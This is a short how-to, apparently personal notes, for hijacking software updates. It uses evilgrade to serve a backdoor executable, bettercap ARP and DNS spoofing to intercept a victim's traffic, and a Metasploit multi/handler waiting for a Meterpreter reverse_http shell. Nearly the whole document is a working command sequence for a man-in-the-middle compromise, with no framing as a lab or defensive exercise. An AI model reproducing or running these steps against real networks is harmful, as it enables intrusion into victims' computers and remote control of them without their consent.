Run by
cd /opt/evilgrade/
./evilgrade

To get a list of all the programs we can hijack their updates:
show modules

To configure a specific module, for example:
configure DAP

Now to see all available options:
show options

The main options we wanna change is agent - path for the backdoor, to do it:
set agent /var/www/html/backdoor.exe

Now to lunch the attack:
start

Now to deliver the attack to the victim you have to be the main in the middle:
Run bettercap man in the middle like this:

bettercap -iface eth0
arp.spoof on
net.sniff on
net.probe on
set arp.spoof.fullduplex true 	If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail).
set net.sniff.local true


we also need to run dns spoof attack for the domain that the target checks for updates by:
dns.spoof on
set dns.spoof.all true
set dns.spoof.domains VIRTUALHOST DOMAIN(EVILGRADE)

Now all we got to do is listen to incoming connection by using metasploit:
For example:
first use this command to listen to incoming connection
msfconsole
use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_http
(same as the backdoor,DONT USE HTTPS DOESNT WORK FOR SOME REASON)
exploit
